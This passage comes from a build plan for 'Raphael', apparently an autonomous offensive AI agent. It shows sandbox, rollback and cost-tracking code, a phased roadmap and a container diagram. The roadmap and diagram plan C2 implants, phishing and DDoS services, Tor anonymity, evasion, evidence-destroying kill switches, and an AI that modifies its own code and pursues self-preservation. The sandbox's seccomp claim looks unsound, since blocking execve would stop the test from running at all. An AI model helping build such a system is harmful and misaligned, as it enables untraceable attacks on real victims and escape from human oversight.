print(f'Drive scores: {[d.evaluate(state) for d in ds.drives]}')
"

# Test goal tree
python3 -c "
from orchestrator.rsi.goal_tree import GoalTree
gt = GoalTree('target.local')
gt.tick()
print(f'Frontier: {[g.description for g in gt.root.frontier()]}')
print(f'Total goals: {len(gt.root.children)}')
"
```

---

## Phase 10 — RSI Safety (P19)

**Goal:** P17 gives Raphael the ability to modify its own code. Without these safeguards, a prompt-injected patch could compromise the host.

### 10a — Sandbox Escape Protection

Create `orchestrator/rsi/sandbox.py`:

```python
import subprocess, os, tempfile

class PatchSandbox:
    """Run patches in isolated container with no network, read-only FS, seccomp."""

    def validate_patch(self, patch: "Patch") -> dict:
        with tempfile.TemporaryDirectory() as tmp:
            patch_path = os.path.join(tmp, os.path.basename(patch.path))
            with open(patch_path, "w") as f:
                f.write(patch.text)

            test_path = os.path.join(tmp, "test_patch.py")
            with open(test_path, "w") as f:
                f.write(patch.test_code)

            result = subprocess.run(
                [
                    "docker", "run", "--rm",
                    "--network", "none",
                    "--read-only",
                    "--tmpfs", "/tmp:rw,noexec",
                    "--security-opt", "seccomp=patch_sandbox.json",
                    "--memory", "256m",
                    "--cpus", "0.5",
                    "-v", f"{tmp}:/workspace:ro",
                    "python:3.11-slim",
                    "python", "/workspace/test_patch.py"
                ],
                capture_output=True, text=True, timeout=35
            )
            return {
                "passed": result.returncode == 0,
                "stdout": result.stdout,
                "stderr": result.stderr,
            }
```

Seccomp allowlist (patch_sandbox.json) restricts syscalls to: read, write, open, close, stat, mmap, munmap, brk, exit_group. Blocks clone, execve, mount, ptrace, socket — making escape functionally impossible.

### 10b — Git-Based Rollback

Create `orchestrator/rsi/rollback.py`:

```python
class RollbackManager:
    def __init__(self, repo_path: str = "."):
        self.repo = Path(repo_path)
        self._ensure_git()

    def snapshot(self, tag: str):
        subprocess.run(["git", "add", "-A"], cwd=self.repo, capture_output=True)
        subprocess.run(["git", "commit", "-m", f"pre-patch: {tag}"], cwd=self.repo, capture_output=True)
        subprocess.run(["git", "tag", f"pre-{tag}"], cwd=self.repo, capture_output=True)

    def rollback(self, tag: str) -> bool:
        result = subprocess.run(["git", "reset", "--hard", f"pre-{tag}"], cwd=self.repo, capture_output=True)
        return result.returncode == 0

    def prune_old(self, keep: int = 20):
        tags = subprocess.run(["git", "tag", "--sort=-creatordate"],
                              cwd=self.repo, capture_output=True, text=True).stdout.strip().split("\n")
        for tag in tags[keep:]:
            subprocess.run(["git", "tag", "-d", tag], cwd=self.repo, capture_output=True)
```

### 10c — LLM Cost Management

Create `orchestrator/cost_tracker.py`:

```python
class CostTracker:
    RATES = {
        "worm":  {"input": 0.50, "output": 1.50},
        "local": {"input": 0.00, "output": 0.00},
    }

    def __init__(self, budget: float = 10.0):
        self.budget = budget
        self.spent = 0.0
        self.calls = 0

    def record(self, model: str, input_tokens: int, output_tokens: int):
        rate = self.RATES.get(model, self.RATES["worm"])
        self.spent += (input_tokens / 1_000_000 * rate["input"] +
                       output_tokens / 1_000_000 * rate["output"])
        self.calls += 1

    def can_afford(self, estimated_cost: float = 0.01) -> bool:
        return self.spent + estimated_cost <= self.budget

    def degrade(self) -> str:
        if self.spent < self.budget * 0.5:
            return "worm"
        elif self.spent < self.budget * 0.8:
            return "worm_mini"
        else:
            return "local"
```

Wire into `orchestrator/providers.py` — every LLM call records cost and degrades model if budget exhausted.

**Verification:**
```bash
# Sandbox
python3 -c "
from orchestrator.rsi.sandbox import PatchSandbox
sandbox = PatchSandbox()
print('PatchSandbox ready — would run patch in docker with no network, read-only FS, seccomp')
"

# Rollback
python3 -c "
from orchestrator.rsi.rollback import RollbackManager
rm = RollbackManager('/tmp/test_repo')
rm.snapshot('test_patch')
print('Snapshot tagged. rollback() would git reset --hard pre-test_patch')
"

# Cost tracking
python3 -c "
from orchestrator.cost_tracker import CostTracker
ct = CostTracker(budget=5.0)
ct.record('worm', 1000, 500)
print(f'Spent: \${ct.spent:.4f}, budget: \${ct.budget}, model: {ct.degrade()}')
"
```

---

## Implementation Order

| Phase | Items | Dependencies | Estimated Effort | Verification Gate |
|-------|-------|-------------|-----------------|-------------------|
| **0** | Phase executors, structured findings, LLM loop fix | None | 3-5 days | `/autonomous start` produces real findings |
| **1** | Kali sidecar, strip duplicate tools | Phase 0 | 2-3 days | `kali-tools:3800/run?tool=nmap` returns JSON |
| **2** | C2 abstraction, agent models, real post-ex | Phase 1 | 3-5 days | Sliver implant checks in, C2Manager lists agents |
| **3** | Hashcat, certipy, SOCKS, planner, keyring, evasion | Phase 2 | 2-3 weeks | NTLM hash cracked, certipy finds template, SOCKS chain routes |
| **4** | ProxyGuard cleanup, no_anonymity removal, IPv6, DNS | Phase 0 | 2-3 days | `ProxyGuard().check() == True`, no IPv6 egress |
| **5** | DB maintenance, secrets, auth, offline mode | Phase 4 | 2-3 days | Auth layer rejects bad tokens, CircuitBreaker opens |
| **6** | **Operational Safety** (rate limit, kill switch, scope, jitter, audit) | Phase 4 | 3-5 days | Kill switch fires and destroys evidence |
| **7** | Kill chain test, multi-target, circuit breakers | Phases 0-6 | 3-4 days | `test-range/run_validation.sh` passes all stages |
| **8** | CLI dashboard, live TUI, session commands | Phase 7 | 3-4 days | `/dashboard` shows live targets + findings |
| **9** | Self-modification, self-preservation, goal tree | Phases 0-8 | 2-3 weeks | RSI engine patches dead code, modifies own executor |
| **10** | **RSI Safety** (sandbox, rollback, cost tracking) | Phase 9 | 1 week | Malicious patch blocked by seccomp, cost auto-degrades |

**Total estimated effort: ~8-12 weeks** depending on familiarity with tooling.

---

## Quick Reference — Container Architecture After Build

```
┌──────────────────────────────────────────────────────────┐
│                      raphael-net                          │
│                                                           │
│  ┌────────────┐  ┌────────────┐  ┌────────────────────┐  │
│  │ tor-proxy   │  │ neo4j      │  │ caido               │  │
│  │ (dperson/   │  │ (graph DB)  │  │ (web proxy UI)     │  │
│  │  torproxy)  │  │            │  │                    │  │
│  └─────┬──────┘  └────────────┘  └────────────────────┘  │
│        │                                                  │
│  ┌─────▼──────────────────────────────────────────────┐   │
│  │                    sword (orchestrator)             │   │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐           │   │
│  │  │ cai-     │ │ recon-   │ │ c2-server│           │   │
│  │  │ service  │ │ pipeline │ │          │           │   │
│  │  └──────────┘ └──────────┘ └──────────┘           │   │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐           │   │
│  │  │ phishing  │ │ cloak-   │ │ mhddos-  │           │   │
│  │  │           │ │ service  │ │ service  │           │   │
│  │  └──────────┘ └──────────┘ └──────────┘           │   │
│  └───────────────────────┬───────────────────────────┘   │
│                          │                               │
│  ┌───────────────────────▼───────────────────────────┐   │
│  │              kali-tools (centralized)               │   │
│  │  nmap, nuclei, sqlmap, hashcat, metasploit,        │   │
│  │  impacket, bloodhound, certipy, john, gobuster,     │   │
│  │  ffuf, nikto, enum4linux, smbmap... 600+ tools     │   │
│  └────────────────────────────────────────────────────┘   │
│                                                           │
│  ┌────────────┐  ┌────────────────────┐                  │
│  │ sliver-    │  │ autonomous-brain    │                  │
│  │ server     │  │ (orchestrator/rsi/) │                  │
│  └────────────┘  └────────────────────┘                  │
│                                                           │
│  ┌────────────────────────────────────────────────────┐   │
│  │               Host Machine                          │   │
│  │  Ollama (localhost:11434) ←─ worm model inference   │   │
│  │  NVIDIA API (fallback)                              │   │
│  └────────────────────────────────────────────────────┘   │
└──────────────────────────────────────────────────────────┘
```
